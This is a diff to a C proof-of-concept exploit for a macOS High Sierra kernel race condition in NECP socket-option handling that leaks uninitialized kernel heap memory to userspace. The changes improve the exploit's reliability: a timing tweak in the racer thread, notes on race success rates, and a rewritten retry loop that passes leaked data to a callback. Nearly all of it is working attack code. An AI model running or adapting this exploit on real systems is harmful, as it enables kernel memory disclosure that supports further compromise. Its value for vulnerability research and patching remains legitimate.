@@ -34,6 +34,11 @@
  * sooptcopyin() and sooptcopyout(). If we can do that, then we will leak uninitialized kernel heap
  * data to userspace.
  *
+ * It turns out that this is a pretty easy race to win. While testing on my 2015 Macbook Pro, the
+ * mean number of attempts to win the race was never more than 600, and the median was never more
+ * than 5. (This testing was conducted with DEBUG off, since the printfs dramatically slow down the
+ * exploit.)
+ *
  * This program exploits this vulnerability to leak data from a kernel heap buffer of a
  * user-specified size. No attempt is made to seed the heap with interesting data. Tested on macOS
  * High Sierra 10.13 (build 17A365).
@@ -127,8 +132,6 @@ struct sockaddr_ctl {
 #define	NECP_CONTROL_NAME "com.apple.net.necp_control"
 
 // ---- Macros ------------------------------------------------------------------------------------
-
-#define DEBUG 0
 
 #if DEBUG
 #define DEBUG_TRACE(fmt, ...)	printf(fmt"\n", ##__VA_ARGS__)
@@ -228,6 +231,9 @@ static void *map_address_racer(void *arg) {
 		// Wait for do_map to become true.
 		while (!context->do_map) {}
 		context->do_map = false;
+		// Do a little bit of work so that the allocation is more likely to take place at
+		// the right time.
+		close(-1);
 		// Re-allocate the address. If this fails, abort.
 		bool success = allocate_map_address(&context->address, context->size);
 		if (!success) {
@@ -277,9 +283,8 @@ static void stop_map_address_racer(struct map_address_racer_context *context) {
 	deallocate_map_address(context->address, context->size);
 }
 
-// Try the NECP leak once. Returns true if we're done and don't need to retry any more.
-static bool try_necp_leak(int ctlfd, kernel_leak_callback_block kernel_leak_callback,
-		struct map_address_racer_context *context, bool *did_leak) {
+// Try the NECP leak once. Returns true if the leak succeeded.
+static bool try_necp_leak(int ctlfd, struct map_address_racer_context *context) {
 	socklen_t length = context->size;
 	// Wait for the map to be deallocated.
 	while (!context->deallocated) {};
@@ -298,32 +303,31 @@ static bool try_necp_leak(int ctlfd, kernel_leak_callback_block kernel_leak_call
 	if (data[0] == 0 && data[1] == 0) {
 		return false;
 	}
-	// WOW! It worked! Now delegate to the leak callback.
-	DEBUG_TRACE("Won the race!");
-	*did_leak |= true;
-	return kernel_leak_callback(context->address, context->size);
+	// WOW! It worked!
+	return true;
 }
 
 // Repeatedly try the NECP leak, until either we succeed or hit the maximum retry limit.
 static bool try_necp_leak_repeat(int ctlfd, kernel_leak_callback_block kernel_leak_callback,
 		struct map_address_racer_context *context) {
 	const size_t MAX_TRIES = 10000000;
-	bool did_leak = false;
-	size_t try = 1;
-	for (;;) {
+	bool has_leaked = false;
+	for (size_t try = 1;; try++) {
 		// Try the leak once.
-		if (try_necp_leak(ctlfd, kernel_leak_callback, context, &did_leak)) {
-			return true;
-		}
-		if (!did_leak) {
-			// If we haven't successfully leaked anything after MAX_TRIES attempts,
-			// give up.
-			if (!did_leak && try >= MAX_TRIES) {
-				ERROR("Giving up after %zu attempts", try);
-				return false;
+		if (try_necp_leak(ctlfd, context)) {
+			DEBUG_TRACE("Triggered the leak after %zu %s!", try,
+					(try == 1 ? "try" : "tries"));
+			try = 0;
+			has_leaked = true;
+			// Give the leak to the callback, and finish if it says we're done.
+			if (kernel_leak_callback(context->address, context->size)) {
+				return true;
 			}
-			// Otherwise, increment the try count.
-			try++;
+		}
+		// If we haven't successfully leaked anything after MAX_TRIES attempts, give up.
+		if (!has_leaked && try >= MAX_TRIES) {
+			ERROR("Giving up after %zu unsuccessful leak attempts", try);
+			return false;
 		}
 		// Reset for another try.
 		context->restart = true;
